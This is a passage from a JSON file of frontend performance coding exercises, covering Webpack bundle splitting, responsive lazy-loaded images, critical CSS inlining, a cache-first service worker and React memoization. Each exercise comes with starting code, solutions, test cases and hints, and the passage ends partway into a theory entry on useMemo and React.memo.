            "Build the project and inspect the `dist` folder: `vendors.js` chunk should exist containing node_modules code.",
            "Build the project and inspect the `dist` folder: `common.js` chunk should exist if there are shared modules (requires some application code to share modules).",
            "Verify that `console.log` statements are removed from the production bundle (if `drop_console` is set in Terser options).",
            "Check bundle sizes are significantly smaller than a non-optimized build."
          ],
          "hints": [
            "The `mode: 'production'` setting enables many optimizations by default, but you still need to configure `minimizer` and `splitChunks` for fine-grained control.",
            "Remember to install `terser-webpack-plugin` if you haven't (`npm install terser-webpack-plugin --save-dev`).",
            "For `splitChunks`, `chunks: 'all'` is often the most effective setting for general-purpose optimization.",
            "Ensure your `output.filename` uses `[contenthash]` for proper caching.",
            "The `clean` option in `output` is useful for preventing stale files in your `dist` directory."
          ],
          "tags": [
            "Webpack",
            "Bundle Optimization",
            "Performance",
            "Build Tools",
            "JavaScript",
            "React"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "webpack_basics",
            "bundle_size_optimization"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "tree_shaking",
            "minification",
            "code_splitting_webpack"
          ]
        },
        {
          "id": "task_image_optimization_1",
          "title": "Implement a Responsive, Lazy-Loaded Product Image Gallery",
          "description": "\nYour task is to create an HTML page with a product image gallery. Each image in the gallery needs to be optimized for responsiveness, use modern image formats with fallbacks, and be lazy-loaded to improve initial page performance.\n\n**Requirements:**\n1.  Create an HTML structure for a simple image gallery (e.g., a `div` containing multiple `figure` or `div` elements, each with an image).\n2.  For each image:\n    *   Use the `<picture>` element to provide a `WebP` version and a `JPEG` fallback.\n    *   Use `srcset` and `sizes` attributes within the `<img>` tag (or `source` tags if appropriate for more complex scenarios, but for this task, primarily `<img>` within `<picture>` is sufficient) to serve different image resolutions based on viewport size. Assume three sizes: `small.webp/jpg` (300w), `medium.webp/jpg` (600w), `large.webp/jpg` (1200w).\n    *   Implement native lazy loading using `loading=\"lazy\"`.\n    *   Provide meaningful `alt` text.\n3.  Demonstrate the responsiveness with `sizes` attributes that specify:\n    *   100% viewport width on screens up to 480px.\n    *   50% viewport width on screens between 481px and 960px.\n    *   33.3vw on screens above 960px.\n\n**Image Placeholder Structure (you don't need actual image files, just use these names):\n`product-1-small.webp`, `product-1-medium.webp`, `product-1-large.webp`\n`product-1-small.jpg`, `product-1-medium.jpg`, `product-1-large.jpg` (and similar for product-2, product-3 etc.)**",
          "difficulty": "medium",
          "startingCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Product Gallery</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        .gallery {\n            display: grid;\n            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\n            gap: 20px;\n        }\n        .gallery-item img { max-width: 100%; height: auto; display: block; }\n    </style>\n</head>\n<body>\n    <h1>Our Products</h1>\n    <div class=\"gallery\">\n        <!-- Add your optimized image elements here -->\n    </div>\n</body>\n</html>\n",
          "solutionCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Product Gallery</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        .gallery {\n            display: grid;\n            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\n            gap: 20px;\n        }\n        .gallery-item img { max-width: 100%; height: auto; display: block; }\n    </style>\n</head>\n<body>\n    <h1>Our Products</h1>\n    <div class=\"gallery\">\n        <div class=\"gallery-item\">\n            <picture>\n                <source \n                    type=\"image/webp\" \n                    srcset=\"product-1-small.webp 300w, product-1-medium.webp 600w, product-1-large.webp 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\">\n                <img \n                    src=\"product-1-small.jpg\" \n                    srcset=\"product-1-small.jpg 300w, product-1-medium.jpg 600w, product-1-large.jpg 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\"\n                    alt=\"Product 1: Ergonomic Gaming Mouse\"\n                    loading=\"lazy\">\n            </picture>\n        </div>\n        <div class=\"gallery-item\">\n            <picture>\n                <source \n                    type=\"image/webp\" \n                    srcset=\"product-2-small.webp 300w, product-2-medium.webp 600w, product-2-large.webp 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\">\n                <img \n                    src=\"product-2-small.jpg\" \n                    srcset=\"product-2-small.jpg 300w, product-2-medium.jpg 600w, product-2-large.jpg 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\"\n                    alt=\"Product 2: Mechanical Keyboard with RGB\"\n                    loading=\"lazy\">\n            </picture>\n        </div>\n        <div class=\"gallery-item\">\n            <picture>\n                <source \n                    type=\"image/webp\" \n                    srcset=\"product-3-small.webp 300w, product-3-medium.webp 600w, product-3-large.webp 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\">\n                <img \n                    src=\"product-3-small.jpg\" \n                    srcset=\"product-3-small.jpg 300w, product-3-medium.jpg 600w, product-3-large.jpg 1200w\" \n                    sizes=\"(max-width: 480px) 100vw, (max-width: 960px) 50vw, 33.3vw\"\n                    alt=\"Product 3: 4K UltraWide Monitor\"\n                    loading=\"lazy\">\n            </picture>\n        </div>\n        <!-- Add more images following the same pattern -->\n    </div>\n</body>\n</html>\n",
          "testCases": [
            "Open in a browser: Only images visible in the initial viewport should load (verify in network tab).",
            "Scroll down: Remaining images should load as they come into view.",
            "Resize browser window (small viewport < 480px): Browser should request the 'small' image variants (e.g., product-1-small.webp).",
            "Resize browser window (medium viewport 481px-960px): Browser should request the 'medium' image variants (e.g., product-1-medium.webp).",
            "Resize browser window (large viewport > 960px): Browser should request the 'large' image variants (e.g., product-1-large.webp).",
            "Test with a browser that doesn't support WebP (e.g., by changing `type=\"image/webp\"` to a non-existent type): Browser should load JPEG fallbacks.",
            "Inspect element: Verify `loading='lazy'`, `srcset`, `sizes`, and `alt` attributes are present."
          ],
          "hints": [
            "Remember that the `<img>` tag inside `<picture>` serves as the ultimate fallback.",
            "The `srcset` on the `<img>` tag inside `<picture>` is also crucial for browsers that support `<picture>` but might not choose a `source` for various reasons, or for handling pixel density with the fallback format.",
            "Pay close attention to the `sizes` attribute syntax for different breakpoints.",
            "Use your browser's developer tools (Network tab) to verify which image files are actually loaded."
          ],
          "tags": [
            "HTML",
            "Images",
            "Responsive Design",
            "Lazy Loading",
            "WebP",
            "Optimization"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "html_basics",
            "css_media_queries"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "srcset_sizes",
            "picture_element",
            "loading_lazy"
          ]
        },
        {
          "id": "task_critical_css_1",
          "title": "Optimize Critical CSS for a Blog Post Page",
          "description": "\nYour task is to optimize the CSS delivery for a simple blog post page. The goal is to ensure the 'above-the-fold' content (header, main title, and initial paragraph) renders as quickly as possible by inlining its critical CSS, while the rest of the styles are loaded asynchronously.\n\n**Requirements:**\n1.  Identify the critical CSS for the `header`, `h1` (post title), and the first `p` (introduction).\n2.  Inline this critical CSS directly into a `<style>` block within the `<head>` section of the HTML document.\n3.  Ensure the main `styles.css` file (containing all other styles) is loaded asynchronously using `rel=\"preload\"`, `as=\"style\"`, and the `onload` trick.\n4.  Include a `noscript` fallback for `styles.css`.\n5.  Add some non-critical styles to `styles.css` that would apply to 'below-the-fold' content (e.g., footer, sidebars, or subsequent paragraphs).\n\n**Assumed Critical Styles:**\n```css\nbody { font-family: sans-serif; margin: 0; line-height: 1.6; color: #333; }\nheader { background: #f4f4f4; padding: 20px; text-align: center; border-bottom: 1px solid #ccc; }\nh1 { color: #2c3e50; font-size: 2.5em; margin-bottom: 10px; }\n.post-intro { font-size: 1.1em; color: #555; }\n```\n\n**Assumed Non-Critical Styles (for `styles.css`):**\n```css\n.post-content { padding: 20px; max-width: 800px; margin: 0 auto; }\n.post-content p { margin-bottom: 1em; }\nfooter { background: #eee; padding: 10px; text-align: center; margin-top: 40px; }\n.sidebar { width: 200px; float: right; margin-left: 20px; }\n```",
          "difficulty": "medium",
          "startingCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>My Awesome Blog Post</title>\n    <!-- Stylesheets will go here -->\n</head>\n<body>\n    <header>\n        <h1>The Importance of Web Performance</h1>\n    </header>\n    <main>\n        <p class=\"post-intro\">Web performance is crucial for user experience and SEO. A fast-loading website keeps users engaged and improves conversion rates.</p>\n        \n        <div class=\"post-content\">\n            <p>This paragraph and subsequent content are considered 'below-the-fold'. Optimizing their loading won't impact initial paint time as much.</p>\n            <p>Further details about performance techniques...</p>\n        </div>\n    </main>\n    <footer>\n        &copy; 2023 My Blog\n    </footer>\n</body>\n</html>\n\n<!-- You will also need to create a `styles.css` file in the same directory -->\n",
          "solutionCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>My Awesome Blog Post</title>\n\n    <!-- Inlined Critical CSS -->\n    <style>\n        body { font-family: sans-serif; margin: 0; line-height: 1.6; color: #333; }\n        header { background: #f4f4f4; padding: 20px; text-align: center; border-bottom: 1px solid #ccc; }\n        h1 { color: #2c3e50; font-size: 2.5em; margin-bottom: 10px; }\n        .post-intro { font-size: 1.1em; color: #555; }\n    </style>\n    \n    <!-- Asynchronously load non-critical CSS -->\n    <link rel=\"preload\" href=\"styles.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">\n    <noscript><link rel=\"stylesheet\" href=\"styles.css\"></noscript>\n</head>\n<body>\n    <header>\n        <h1>The Importance of Web Performance</h1>\n    </header>\n    <main>\n        <p class=\"post-intro\">Web performance is crucial for user experience and SEO. A fast-loading website keeps users engaged and improves conversion rates.</p>\n        \n        <div class=\"post-content\">\n            <p>This paragraph and subsequent content are considered 'below-the-fold'. Optimizing their loading won't impact initial paint time as much.</p>\n            <p>Further details about performance techniques...</p>\n        </div>\n    </main>\n    <footer>\n        &copy; 2023 My Blog\n    </footer>\n</body>\n</html>\n\n\n/* --- Create this file as `styles.css` in the same directory --- */\n/* Non-critical CSS */\n.post-content { padding: 20px; max-width: 800px; margin: 0 auto; }\n.post-content p { margin-bottom: 1em; }\nfooter { background: #eee; padding: 10px; text-align: center; margin-top: 40px; }\n.sidebar { width: 200px; float: right; margin-left: 20px; border: 1px dashed #ccc; padding: 10px;}\n\n/* Example of styles that would cause layout shift if not carefully managed */\n/* body { overflow-x: hidden; } */\n",
          "testCases": [
            "Open the HTML file in a browser.",
            "Verify that the header, H1, and the introductory paragraph are immediately styled correctly.",
            "Observe the network tab: `styles.css` should be requested, but it should not block the initial rendering (e.g., FCP should be fast).",
            "Disable JavaScript in the browser settings and reload the page: All styles from `styles.css` should still apply, demonstrating the `noscript` fallback."
          ],
          "hints": [
            "Place the `<style>` block containing critical CSS as early as possible in the `<head>`.",
            "The `onload` attribute is crucial to switch `rel='preload'` to `rel='stylesheet'` after the CSS file is fetched.",
            "Make sure to correctly define the `href` and `as='style'` attributes for the preload link.",
            "The `noscript` tag provides accessibility and fallback for users without JavaScript."
          ],
          "tags": [
            "CSS",
            "Performance",
            "FCP",
            "LCP",
            "Optimization",
            "HTML"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "html_basics",
            "css_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "critical_css_optimization",
            "render_blocking_resources"
          ]
        },
        {
          "id": "task_caching_1",
          "title": "Implement a Service Worker with Cache-First and Cache Busting",
          "description": "\nYour task is to create a Service Worker that implements a 'Cache First, then Network' strategy for static assets and demonstrates cache busting for new versions. The application consists of `index.html`, `app.js`, and `style.css`.\n\n**Requirements:**\n1.  **Service Worker Registration**: Register the Service Worker (`sw.js`) from your main `index.html`.\n2.  **Installation**: In `sw.js`, pre-cache `index.html`, `app.js`, and `style.css` during the `install` event.\n3.  **Fetch Strategy**: Implement a 'Cache First, then Network' strategy in the `fetch` event listener for all requests. If a request is found in cache, serve it immediately. Otherwise, fetch from the network, cache the response, and then return it.\n4.  **Activation/Cleanup**: In the `activate` event, clean up any old caches to ensure only the latest version (`V2` in the initial setup, but adaptable) is active.\n5.  **Cache Busting**: Demonstrate how to update the Service Worker and its cache. When you change the `CACHE_VERSION`, the Service Worker should update and clear old caches.\n\n**Provided Files:**\n-   `index.html` (minimal HTML)\n-   `app.js` (simple script)\n-   `style.css` (simple styles)",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Service Worker Demo</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <h1>Service Worker Caching Demo</h1>\n    <p>Check the network tab to see caching in action.</p>\n    <script src=\"app.js\"></script>\n    <script>\n        // Service Worker registration logic goes here\n    </script>\n</body>\n</html>\n\n\n/* style.css */\nbody { font-family: sans-serif; background-color: #f0f0f0; margin: 20px; }\nh1 { color: #333; }\np { color: #555; }\n\n\n// app.js\nconsole.log('App.js loaded!');\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Service Worker Demo</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <h1>Service Worker Caching Demo</h1>\n    <p>Check the network tab to see caching in action. Current Version: <span id=\"version\"></span></p>\n    <script src=\"app.js\"></script>\n    <script>\n        document.getElementById('version').textContent = 'V2'; // Update this to match your CACHE_VERSION\n        if ('serviceWorker' in navigator) {\n            window.addEventListener('load', () => {\n                navigator.serviceWorker.register('/sw.js')\n                    .then(registration => {\n                        console.log('Service Worker registered with scope:', registration.scope);\n                    })\n                    .catch(error => {\n                        console.error('Service Worker registration failed:', error);\n                    });\n            });\n        }\n    </script>\n</body>\n</html>\n\n\n/* style.css */\nbody { font-family: sans-serif; background-color: #e0f7fa; margin: 20px; }\nh1 { color: #00796b; }\np { color: #263238; }\n\n\n// app.js\nconsole.log('App.js loaded! (V2)'); // Update content to demonstrate cache busting\n\n\n// sw.js\nconst CACHE_VERSION = 'v2'; // Increment this version number to bust cache\nconst CACHE_NAME = `my-app-cache-${CACHE_VERSION}`;\nconst ASSETS_TO_CACHE = [\n  '/', // The root path is important for offline capabilities\n  '/index.html',\n  '/app.js',\n  '/style.css'\n];\n\n// Install event: pre-cache static assets\nself.addEventListener('install', event => {\n  console.log(`[SW] Installing Service Worker ${CACHE_VERSION}...`);\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('[SW] Pre-caching assets...');\n        return cache.addAll(ASSETS_TO_CACHE);\n      })\n      .catch(error => {\n        console.error('[SW] Pre-caching failed:', error);\n      })\n  );\n  self.skipWaiting(); // Forces the waiting service worker to become the active service worker.\n});\n\n// Activate event: clean up old caches\nself.addEventListener('activate', event => {\n  console.log(`[SW] Activating new Service Worker ${CACHE_VERSION}...`);\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheName !== CACHE_NAME && cacheName.startsWith('my-app-cache-')) {\n            console.log('[SW] Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n  self.clients.claim(); // Immediately takes control of clients\n});\n\n// Fetch event: Cache First, then Network strategy\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request) // Try to find a match in the cache\n      .then(cachedResponse => {\n        if (cachedResponse) {\n          console.log('[SW] Serving from cache:', event.request.url);\n          return cachedResponse;\n        }\n\n        // If not found in cache, go to network\n        console.log('[SW] Fetching from network:', event.request.url);\n        return fetch(event.request)\n          .then(networkResponse => {\n            // Check if response is valid before caching\n            if (!networkResponse || networkResponse.status !== 200 || networkResponse.type !== 'basic') {\n              return networkResponse;\n            }\n            \n            // Clone the response because it's a stream and can only be consumed once\n            const responseToCache = networkResponse.clone();\n            caches.open(CACHE_NAME)\n              .then(cache => {\n                cache.put(event.request, responseToCache);\n              });\n            return networkResponse;\n          })\n          .catch(error => {\n            console.error('[SW] Fetch failed, and no cache match:', event.request.url, error);\n            // This catch is for network failures. You might return an offline fallback here.\n            // For this basic example, we'll just let the original error propagate if no cache.\n          });\n      })\n  );\n});\n",
          "testCases": [
            "1.  **Initial Load (V1 -> V1)**:\n    *   Open `index.html` for the first time.\n    *   Verify `sw.js` is registered.\n    *   Network tab: `index.html`, `app.js`, `style.css` should show 'ServiceWorker' in the Size/Transfer column (or similar indication they are served by SW after first network fetch and caching).\n    *   Application Console: Should log '[SW] Installing...', '[SW] Pre-caching assets...'.\n2.  **Subsequent Load (V1 -> V1)**:\n    *   Close and reopen the browser tab (or hard refresh if needed).\n    *   Network tab: `index.html`, `app.js`, `style.css` should show 'ServiceWorker' or 'disk cache', indicating they are served from cache without network request.\n3.  **Cache Busting (V1 -> V2)**:\n    *   Modify `app.js` (e.g., change `console.log('App.js loaded!');` to `console.log('App.js loaded! (V2)');`).\n    *   Modify `style.css` (e.g., change `background-color` to `e0f7fa`).\n    *   **Crucially, increment `CACHE_VERSION` in `sw.js` (e.g., `const CACHE_VERSION = 'v2';`)**.\n    *   Open `index.html`.\n    *   Initially, the old content might be served from `V1` cache (due to Service Worker update cycle).\n    *   Perform a *second* refresh or close/reopen tab.\n    *   Verify that `app.js` and `style.css` now reflect the V2 changes (new console log, new background color).\n    *   Network tab: Verify the new `V2` assets are loaded (either from network then cached, or directly from new SW cache).\n    *   Application Console: Should log '[SW] Activating new Service Worker v2...' and '[SW] Deleting old cache: my-app-cache-v1'."
          ],
          "hints": [
            "Make sure your Service Worker file (`sw.js`) is at the root of your project or served from a path that allows it to control the desired scope (e.g., `/` for the entire app).",
            "The `self.skipWaiting()` in `install` and `self.clients.claim()` in `activate` are useful for immediate updates but can be tricky in production. For this exercise, they help demonstrate the update cycle.",
            "Remember to `clone()` the network response before `put()`ting it into the cache because responses are streams and can only be consumed once.",
            "To test cache busting, you must increment the `CACHE_VERSION` variable in `sw.js` and then refresh the page twice (or close/reopen the tab) to ensure the new Service Worker takes control and cleans up the old cache."
          ],
          "tags": [
            "Service Worker",
            "Caching",
            "PWA",
            "Offline",
            "JavaScript",
            "Performance"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "javascript_promises",
            "fetch_api",
            "service_worker_basics"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "http_caching",
            "service_worker_lifecycle",
            "cache_first_strategy",
            "cache_busting"
          ]
        },
        {
          "id": "task_react_memoization_1",
          "title": "Optimize a React Data Table with Memoization",
          "description": "\nYour task is to optimize a React component that renders a large data table. The table receives `data` (an array of items) and `columns` (an array of column definitions). It also has a `filterText` state to filter the data and a `sortOrder` state to sort it. The table component (`DataTable`) should be optimized to prevent unnecessary re-renders, and any expensive data processing (filtering, sorting) should also be memoized.\n\n**Requirements:**\n1.  Wrap the `DataTable` component with `React.memo`.\n2.  Inside `DataTable`, use `useMemo` to memoize the `filteredAndSortedData` array. This array should only be recomputed if `data`, `filterText`, or `sortOrder` change.\n3.  Ensure the `filterText` and `sortOrder` states are managed in a parent component (`App`).\n4.  Add a dummy state to the parent (`App`) that causes it to re-render without affecting the table's props, to verify `React.memo`'s effectiveness (e.g., a simple counter).\n5.  Include `console.log` statements to observe when `App` renders, `DataTable` renders, and when the data filtering/sorting logic re-executes.\n\n**Data Structure Example:**\n`[{ id: 1, name: 'Apple', category: 'Fruit', price: 1.0 }, ...]`",
          "difficulty": "hard",
          "startingCode": "import React, { useState } from 'react';\n\nconst DataTable = ({ data, filterText, sortOrder }) => {\n  console.log('DataTable (component) rendered');\n\n  // Unoptimized filtering and sorting (should be memoized)\n  let processedData = [...data];\n  if (filterText) {\n    processedData = processedData.filter(item => \n      item.name.toLowerCase().includes(filterText.toLowerCase())\n    );\n  }\n  processedData.sort((a, b) => {\n    if (sortOrder === 'asc') return a.name.localeCompare(b.name);\n    if (sortOrder === 'desc') return b.name.localeCompare(a.name);\n    return 0;\n  });\n  console.log('Filtering and sorting data...');\n\n  return (\n    <div style={{ margin: '20px', border: '1px solid #ccc', padding: '10px' }}>\n      <h2>Data Table ({processedData.length} items)</h2>\n      <input \n        type=\"text\" \n        placeholder=\"Filter by name...\" \n        value={filterText}\n        onChange={() => {}}\n      />\n      <select value={sortOrder} onChange={() => {}}>\n        <option value=\"\">No Sort</option>\n        <option value=\"asc\">Name A-Z</option>\n        <option value=\"desc\">Name Z-A</option>\n      </select>\n      <table>\n        <thead>\n          <tr>\n            <th>ID</th>\n            <th>Name</th>\n            <th>Category</th>\n            <th>Price</th>\n          </tr>\n        </thead>\n        <tbody>\n          {processedData.map(item => (\n            <tr key={item.id}>\n              <td>{item.id}</td>\n              <td>{item.name}</td>\n              <td>{item.category}</td>\n              <td>{item.price}</td>\n            </tr>\n          ))}\n        </tbody>\n      </table>\n    </div>\n  );\n};\n\nconst App = () => {\n  const [filter, setFilter] = useState('');\n  const [sort, setSort] = useState('');\n  // Add dummy state here\n\n  const mockData = [\n    { id: 1, name: 'Apple', category: 'Fruit', price: 1.0 },\n    { id: 2, name: 'Banana', category: 'Fruit', price: 0.5 },\n    { id: 3, name: 'Carrot', category: 'Vegetable', price: 0.75 },\n    { id: 4, name: 'Dates', category: 'Fruit', price: 2.0 },\n    { id: 5, name: 'Eggplant', category: 'Vegetable', price: 1.25 }\n  ];\n\n  console.log('App (component) rendered');\n\n  return (\n    <div>\n      {/* Render DataTable here */}\n    </div>\n  );\n};\n\nexport default App;\n",
          "solutionCode": "import React, { useState, useMemo, useCallback } from 'react';\n\n// DataTable component wrapped with React.memo\nconst DataTable = React.memo(({ data, filterText, sortOrder, onFilterChange, onSortChange }) => {\n  console.log('DataTable (component) rendered');\n\n  // Memoize the filtering and sorting operation\n  const filteredAndSortedData = useMemo(() => {\n    console.log('Filtering and sorting data...'); // This should only log when data, filterText, or sortOrder changes\n    let processedData = [...data];\n    if (filterText) {\n      processedData = processedData.filter(item => \n        item.name.toLowerCase().includes(filterText.toLowerCase())\n      );\n    }\n    processedData.sort((a, b) => {\n      if (sortOrder === 'asc') return a.name.localeCompare(b.name);\n      if (sortOrder === 'desc') return b.name.localeCompare(a.name);\n      return 0;\n    });\n    return processedData;\n  }, [data, filterText, sortOrder]); // Dependencies for useMemo\n\n  return (\n    <div style={{ margin: '20px', border: '1px solid #ccc', padding: '10px' }}>\n      <h2>Data Table ({filteredAndSortedData.length} items)</h2>\n      <input \n        type=\"text\" \n        placeholder=\"Filter by name...\" \n        value={filterText}\n        onChange={onFilterChange} // Use memoized callback from parent\n      />\n      <select value={sortOrder} onChange={onSortChange}> {/* Use memoized callback from parent */}\n        <option value=\"\">No Sort</option>\n        <option value=\"asc\">Name A-Z</option>\n        <option value=\"desc\">Name Z-A</option>\n      </select>\n      <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '15px' }}>\n        <thead>\n          <tr style={{ background: '#f0f0f0' }}>\n            <th style={{ padding: '8px', border: '1px solid #ddd', textAlign: 'left' }}>ID</th>\n            <th style={{ padding: '8px', border: '1px solid #ddd', textAlign: 'left' }}>Name</th>\n            <th style={{ padding: '8px', border: '1px solid #ddd', textAlign: 'left' }}>Category</th>\n            <th style={{ padding: '8px', border: '1px solid #ddd', textAlign: 'left' }}>Price</th>\n          </tr>\n        </thead>\n        <tbody>\n          {filteredAndSortedData.map(item => (\n            <tr key={item.id}>\n              <td style={{ padding: '8px', border: '1px solid #ddd' }}>{item.id}</td>\n              <td style={{ padding: '8px', border: '1px solid #ddd' }}>{item.name}</td>\n              <td style={{ padding: '8px', border: '1px solid #ddd' }}>{item.category}</td>\n              <td style={{ padding: '8px', border: '1px solid #ddd' }}>{item.price.toFixed(2)}</td>\n            </tr>\n          ))}\n          {filteredAndSortedData.length === 0 && (\n            <tr><td colSpan=\"4\" style={{ textAlign: 'center', padding: '10px' }}>No items found</td></tr>\n          )}\n        </tbody>\n      </table>\n    </div>\n  );\n});\n\nconst App = () => {\n  const [filter, setFilter] = useState('');\n  const [sort, setSort] = useState('');\n  const [dummyCounter, setDummyCounter] = useState(0); // Dummy state for parent re-renders\n\n  const mockData = useMemo(() => [\n    { id: 1, name: 'Apple', category: 'Fruit', price: 1.0 },\n    { id: 2, name: 'Banana', category: 'Fruit', price: 0.5 },\n    { id: 3, name: 'Carrot', category: 'Vegetable', price: 0.75 },\n    { id: 4, name: 'Dates', category: 'Fruit', price: 2.0 },\n    { id: 5, name: 'Eggplant', category: 'Vegetable', price: 1.25 },\n    { id: 6, name: 'Fig', category: 'Fruit', price: 1.5 },\n    { id: 7, name: 'Grape', category: 'Fruit', price: 3.0 },\n    { id: 8, name: 'Honey', category: 'Sweetener', price: 5.0 },\n  ], []); // Memoize mockData so its reference is stable\n\n  // Memoize event handlers for DataTable props\n  const handleFilterChange = useCallback((e) => {\n    setFilter(e.target.value);\n  }, []); // No dependencies, as setFilter is stable\n\n  const handleSortChange = useCallback((e) => {\n    setSort(e.target.value);\n  }, []); // No dependencies, as setSort is stable\n\n  console.log('App (component) rendered. Dummy Counter:', dummyCounter);\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>My Product Dashboard</h1>\n      <button onClick={() => setDummyCounter(prev => prev + 1)}>\n        Increment Dummy Counter ({dummyCounter})\n      </button>\n      <DataTable \n        data={mockData} \n        filterText={filter} \n        sortOrder={sort}\n        onFilterChange={handleFilterChange}\n        onSortChange={handleSortChange}\n      />\n    </div>\n  );\n};\n\nexport default App;\n",
          "testCases": [
            "1.  **Initial Render**: `App (component) rendered` and `DataTable (component) rendered` should log once. `Filtering and sorting data...` should log once.",
            "2.  **Change Filter Text**: Typing in the filter input should cause `App` to re-render, `DataTable` to re-render, and `Filtering and sorting data...` to log *only when the filter text changes* (not on every keystroke if the component re-renders for other reasons, assuming memoization works as intended for the calculation).",
            "3.  **Change Sort Order**: Changing the sort dropdown should cause `App` to re-render, `DataTable` to re-render, and `Filtering and sorting data...` to log *only when the sort order changes*.",
            "4.  **Increment Dummy Counter**: Clicking 'Increment Dummy Counter' button:\n    *   `App (component) rendered` should log.\n    *   `DataTable (component) rendered` should *NOT* log (due to `React.memo`).\n    *   `Filtering and sorting data...` should *NOT* log (due to `useMemo`).\n    This is the key test for effective memoization."
          ],
          "hints": [
            "Remember that `React.memo` is a HOC that wraps your functional component.",
            "The `useMemo` hook takes a function that returns the value to be memoized, and a dependency array.",
            "For event handlers passed as props to a memoized child, you'll likely need to use `useCallback` in the parent component to ensure their references are stable.",
            "Always define precise dependency arrays for `useMemo` and `useCallback` to avoid stale closures or over-memoization.",
            "For the `mockData` array, declaring it inside `App` would cause a new array reference on every render. Consider memoizing it with `useMemo` or defining it outside the component if it's truly static."
          ],
          "tags": [
            "React",
            "Memoization",
            "Hooks",
            "Performance",
            "Data Table",
            "Optimization"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "react_functional_components",
            "react_hooks_useState",
            "react_memo",
            "useMemo",
            "useCallback"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "react_memoization",
            "react_re_renders"
          ]
        }
      ]
    }
  },
  {
    "id": "0e0505ae-25f5-4faf-b0be-73ac61d29917",
    "startLine": 12600,
    "endLine": 12699,
    "processedDate": "2025-06-17T13:03:24.094Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_react_memoization",
          "title": "React Performance Optimization with useMemo, useCallback, and React.memo",
          "content": "React provides several hooks and HOCs (Higher-Order Components) to optimize component re-renders and improve application performance. The core idea behind these optimizations is 'memoization', a technique that caches the result of a function call and returns the cached result when the same inputs occur again, avoiding re-computation or re-rendering.\n\n## `useMemo` Hook\n`useMemo` is a React Hook that lets you cache the result of an expensive calculation between re-renders. It takes two arguments: a 'create' function and a dependency array. The create function is executed only when one of the dependencies in the array changes. If the dependencies are the same as the last render, `useMemo` returns the previously computed value, preventing unnecessary re-calculations.\n\n### When to use `useMemo`:\n*   **Expensive Calculations**: For computations that consume significant CPU time or resources.\n*   **Preventing Re-renders of Child Components**: When a calculated value is passed as a prop to a child component, `useMemo` can ensure the child only re-renders if the calculated value itself changes, and not just because the parent re-rendered.\n*   **Referential Equality**: When you need to preserve object or array reference equality across re-renders for comparisons (e.g., in `useEffect` dependencies or `React.memo` checks).\n\n## `useCallback` Hook\n`useCallback` is a React Hook that lets you cache a function definition between re-renders. It also takes a function and a dependency array. It returns a memoized version of the callback function that only changes if one of the dependencies has changed. This is particularly useful for optimizing child components that rely on referential equality checks for their props (e.g., components wrapped with `React.memo`). If a parent component re-renders, a function defined directly within it would be re-created on every render, leading to unnecessary re-renders in memoized child components.\n\n### When to use `useCallback`:\n*   **Passing Callbacks to Memoized Child Components**: To prevent unnecessary re-renders of child components that are wrapped in `React.memo` and receive callback functions as props.\n*   **Optimizing `useEffect` Dependencies**: To prevent `useEffect` from re-running unnecessarily when a callback function is part of its dependency array.\n\n## `React.memo` HOC\n`React.memo` is a higher-order component that 